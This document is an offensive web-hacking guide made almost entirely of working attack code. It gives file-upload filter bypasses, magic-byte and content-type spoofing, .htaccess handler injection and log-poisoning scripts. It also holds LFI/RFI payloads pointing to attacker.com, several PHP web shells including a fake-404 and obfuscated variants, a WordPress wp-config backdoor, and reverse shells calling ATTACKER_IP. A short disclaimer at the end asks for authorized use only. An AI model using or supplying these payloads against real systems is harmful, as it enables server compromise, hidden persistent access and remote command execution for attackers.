# COMPREHENSIVE WEB SHELL UPLOAD GUIDE

## 1. FILE UPLOAD BYPASS TECHNIQUES

### 1.1 Extension Bypass Methods

#### Double Extension
```
shell.php.jpg
shell.php.png
shell.php.gif
shell.jpg.php
test.php.test
```

#### Case Manipulation
```
shell.PHp
shell.PhP
shell.pHp
sHell.php
SHELL.PHP
```

#### Alternative PHP Extensions
```
shell.phtml
shell.php3
shell.php4
shell.php5
shell.php7
shell.phar
shell.inc
```

#### Null Byte Injection (PHP < 5.3.4)
```
shell.php%00.jpg
shell.php\x00.jpg
shell.jpg%00.php
```

#### Special Characters
```
shell.php.
shell.php(space)
shell.php:
shell.php;
shell.php/
shell.php\
```

#### URL Encoding
```
shell.php%2Ejpg
shell.%70hp
shell.ph%70
```

### 1.2 Content-Type Bypass

#### Common Content-Type Spoofing
```html
<script>
// JavaScript content-type override
var file = new File(["<?php system($_GET['cmd']); ?>"], "shell.jpg", {
  type: "image/jpeg"
});

// FormData manipulation
var formData = new FormData();
formData.append('file', file);
</script>
```

#### cURL Content-Type Spoofing
```bash
curl -X POST \
  -F "file=@shell.php" \
  -H "Content-Type: image/jpeg" \
  http://target.com/upload.php
```

### 1.3 Magic Bytes Bypass

#### Common Magic Headers
```php
// JPEG
\xFF\xD8\xFF\xE0 <?php system($_GET['cmd']); ?>

// PNG
\x89PNG\x0D\x0A\x1A\x0A <?php system($_GET['cmd']); ?>

// GIF87a
GIF87a <?php system($_GET['cmd']); ?>

// GIF89a  
GIF89a <?php system($_GET['cmd']); ?>

// PDF
%PDF-1.4 <?php system($_GET['cmd']); ?>
```

#### Magic Bytes Generator Script
```php
<?php
// magic_shell.php
$magic_headers = [
    'jpg' => "\xFF\xD8\xFF\xE0",
    'png' => "\x89PNG\x0D\x0A\x1A\x0A", 
    'gif' => "GIF89a",
    'pdf' => "%PDF-1.4"
];

$php_shell = '<?php system($_GET["cmd"]); ?>';

foreach($magic_headers as $ext => $header) {
    $filename = "shell_magic.$ext";
    file_put_contents($filename, $header . $php_shell);
    echo "Created: $filename\n";
}
?>
```

## 2. .htaccess INJECTION TECHNIQUES

### 2.1 Basic .htaccess Shell

```apache
# Method 1: AddHandler
AddHandler application/x-httpd-php .pwn
AddType application/x-httpd-php .pwn

# Method 2: SetHandler  
<FilesMatch "\.pwn$">
SetHandler application/x-httpd-php
</FilesMatch>

# Method 3: Force PHP for all files in directory
<Files *>
SetHandler application/x-httpd-php
</Files>

# Method 4: Specific extension
<Files "*.shell">
SetHandler application/x-httpd-php
</Files>
```

### 2.2 Advanced .htaccess Techniques

```apache
# Bypass extension filtering
AddType application/x-httpd-php .jpg .png .gif .txt .log

# Execute PHP from any file with specific pattern
<FilesMatch "shell">
SetHandler application/x-httpd-php
</FilesMatch>

# Directory specific handler
<Directory /uploads>
AddHandler php5-script .abc
</Directory>

# Rewrite rule to execute PHP
RewriteEngine On
RewriteRule ^(.*)\.test$ $1.php
```

### 2.3 .htaccess Upload Strategy

1. **Upload .htaccess first**
2. **Upload shell with allowed extension**
3. **Access via crafted URL**

Example:
```apache
# .htaccess content
AddType application/x-httpd-php .abc

# Upload shell.abc
<?php system($_GET['cmd']); ?>

# Access: http://site.com/uploads/shell.abc?cmd=id
```

## 3. LOG POISONING TECHNIQUES

### 3.1 Finding Log Files

```php
<?php
// Find log files
$common_logs = [
    '/var/log/apache2/access.log',
    '/var/log/httpd/access_log', 
    '/var/log/nginx/access.log',
    '/var/log/apache/access.log',
    '/usr/local/apache2/logs/access_log',
    '/var/www/logs/access.log',
    '/var/log/sshd.log',
    '/var/log/mail.log',
    '/var/log/vsftpd.log'
];

foreach($common_logs as $log) {
    if(file_exists($log)) {
        echo "Found: $log\n";
    }
}
?>
```

### 3.2 Poisoning Methods

#### User-Agent Poisoning
```bash
curl -H "User-Agent: <?php system(\$_GET['c']); ?>" http://target.com/

# With encoded payload
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target.com/
```

#### Referer Poisoning  
```bash
curl -H "Referer: <?php system(\$_GET['cmd']); ?>" http://target.com/
```

#### GET Parameter Poisoning
```bash
curl "http://target.com/index.php?page=<?php system(\$_GET['cmd']); ?>"
```

#### Cookie Poisoning
```bash
curl -H "Cookie: PHPSESSID=<?php system(\$_GET['cmd']); ?>" http://target.com/
```

### 3.3 Automated Log Poisoning

```python
#!/usr/bin/env python3
import requests
import sys
import urllib.parse

def log_poison(target, lfi_param, log_path):
    payloads = [
        "<?php system($_GET['cmd']); ?>",
        "<?php exec($_GET['c']); ?>",
        "<?php shell_exec($_GET['cmd']); ?>",
        "<?php passthru($_GET['command']); ?>"
    ]
    
    for payload in payloads:
        # Poison via User-Agent
        headers = {'User-Agent': payload}
        requests.get(target, headers=headers)
        
        # Poison via Referer
        headers = {'Referer': payload}
        requests.get(target, headers=headers)
        
        # Test LFI with command execution
        cmd = "whoami"
        url = f"{target}?{lfi_param}={urllib.parse.quote(log_path)}&cmd={cmd}"
        response = requests.get(url)
        
        if response.text and len(response.text) > 0:
            print(f"[SUCCESS] Payload worked: {payload}")
            print(f"Output: {response.text[:200]}")
            return True
    
    return False

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 log_poison.py <target> <lfi_param> <log_path>")
        sys.exit(1)
        
    target = sys.argv[1]
    lfi_param = sys.argv[2] 
    log_path = sys.argv[3]
    
    log_poison(target, lfi_param, log_path)
```

## 4. FILE INCLUSION TECHNIQUES

### 4.1 Local File Inclusion (LFI)

#### Basic LFI
```
http://target.com/page.php?file=../../../../etc/passwd
http://target.com/index.php?page=/etc/passwd
http://target.com/view.php?file=../../../config.php
```

#### LFI to RCE
```
# With PHP wrapper
http://target.com/page.php?file=php://filter/convert.base64-encode/resource=index.php

# With input wrapper
http://target.com/page.php?file=php://input&cmd=id

# With data wrapper
http://target.com/page.php?file=data://text/plain,<?php system('id');?>

# With expect wrapper (if enabled)
http://target.com/page.php?file=expect://id
```

### 4.2 Remote File Inclusion (RFI)

#### Basic RFI
```
http://target.com/page.php?file=http://attacker.com/shell.txt
http://target.com/index.php?page=http://evil.com/cmd.php
```

#### RFI with Data Protocol
```
http://target.com/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

## 5. WEB SHELL TEMPLATES

### 5.1 Basic PHP Shell
```php
<?php system($_GET['cmd']); ?>
```

### 5.2 Advanced PHP Shell
```php
<?php
if(isset($_REQUEST['cmd'])) {
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

<!-- Hidden form -->
<form method="post">
<input type="text" name="cmd" style="display:none" id="cmd">
<input type="submit" style="display:none">
</form>
```

### 5.3 Full Featured Web Shell
```php
<?php
// full_shell.php
error_reporting(0);
echo "<html><head><title>404 Not Found</title></head><body>";
echo "<h1>Not Found</h1><p>The requested URL was not found on this server.</p>";

if(isset($_GET['cmd']) || isset($_POST['cmd'])) {
    $cmd = isset($_GET['cmd']) ? $_GET['cmd'] : $_POST['cmd'];
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}

if(isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "File uploaded: " . $_FILES['file']['name'];
}

echo "</body></html>";
?>
```

### 5.4 Obfuscated Shell
```php
<?php
// obfuscated_shell.php
$f = 's'.'y'.'s'.'t'.'e'.'m';
if(isset($_GET['c'])) {
    $f($_GET['c']);
}

// Base64 encoded alternative
if(isset($_GET['x'])) {
    eval(base64_decode($_GET['x']));
}
?>
```

## 6. AUTOMATED UPLOAD SCRIPTS

### 6.1 PHP Uploader
```php
<?php
// uploader.php
$upload_dir = "uploads/";

if(!is_dir($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

if(isset($_FILES['file'])) {
    $filename = $_FILES['file']['name'];
    $temp_file = $_FILES['file']['tmp_name'];
    $target_file = $upload_dir . $filename;
    
    if(move_uploaded_file($temp_file, $target_file)) {
        echo "File uploaded: " . $target_file . "<br>";
        echo "<a href='$target_file'>Access File</a><br>";
        
        // Test execution
        if(preg_match('/\.php$/i', $filename)) {
            include($target_file);
        }
    }
}
?>

<form method="post" enctype="multipart/form-data">
<input type="file" name="file">
<input type="submit" value="Upload">
</form>
```

### 6.2 cURL Upload Script
```bash
#!/bin/bash
# upload_shell.sh

TARGET="$1"
SHELL_FILE="$2"

if [ -z "$TARGET" ] || [ -z "$SHELL_FILE" ]; then
    echo "Usage: $0 <target_url> <shell_file>"
    exit 1
fi

# Try different upload techniques
echo "[*] Testing file upload to $TARGET"

# Method 1: Direct upload
curl -F "file=@$SHELL_FILE" "$TARGET" 

# Method 2: With spoofed content-type
curl -F "file=@$SHELL_FILE" -H "Content-Type: image/jpeg" "$TARGET"

# Method 3: Double extension
cp "$SHELL_FILE" "shell.php.jpg"
curl -F "file=@shell.php.jpg" "$TARGET"

# Method 4: Case manipulation  
cp "$SHELL_FILE" "shell.PHp"
curl -F "file=@shell.PHp" "$TARGET"
```

## 7. DETECTION EVASION

### 7.1 Obfuscation Techniques
```php
<?php
// XOR obfuscation
$key = 'secret';
$payload = base64_decode('encoded_shell_here');
$output = '';
for($i = 0; $i < strlen($payload); $i++) {
    $output .= $payload[$i] ^ $key[$i % strlen($key)];
}
eval($output);
?>

<?php
// String concatenation
$c = 's'.'y'.'s'.'t'.'e'.'m';
$c($_GET['x']);

// Variable variables
$a = '_GET';
$b = $$a;
$c = $b['cmd'];
system($c);
?>
```

### 7.2 Backdoor Techniques
```php
<?php
// Wordpress backdoor
// Add to wp-config.php
if(isset($_GET['admin'])) {
    eval($_POST['cmd']);
}

// .htaccess backdoor
#<Files "index.php">
#SetHandler application/x-httpd-php
#</Files>

// Log file backdoor
// Poison logs then include via LFI
?>
```

## 8. POST-EXPLOITATION

### 8.1 Reverse Shells
```php
<?php
// PHP Reverse Shell
$sock=fsockopen("ATTACKER_IP",4444);
exec("/bin/sh -i <&3 >&3 2>&3");

// Bash reverse shell
system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");

// Python reverse shell
system("python -c 'import socket,os,subprocess;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\"])'");
?>
```

### 8.2 Privilege Escalation Checks
```php
<?php
// privcheck.php
echo "User: "; system("whoami");
echo "\nID: "; system("id");
echo "\nSUDO: "; system("sudo -l");
echo "\nOS: "; system("uname -a");
echo "\nProcesses: "; system("ps aux");
echo "\nNetwork: "; system("netstat -tulpn");
echo "\nCrontab: "; system("crontab -l");
?>
```

## USAGE NOTES:

1. **Legal Use Only** - Only test on systems you own
2. **Permission Required** - Always get written authorization
3. **Detection Risk** - Most techniques are detectable by WAF/IDS
4. **Clean Up** - Always remove shells after testing

Save this as `webshell_upload_guide.txt` for reference.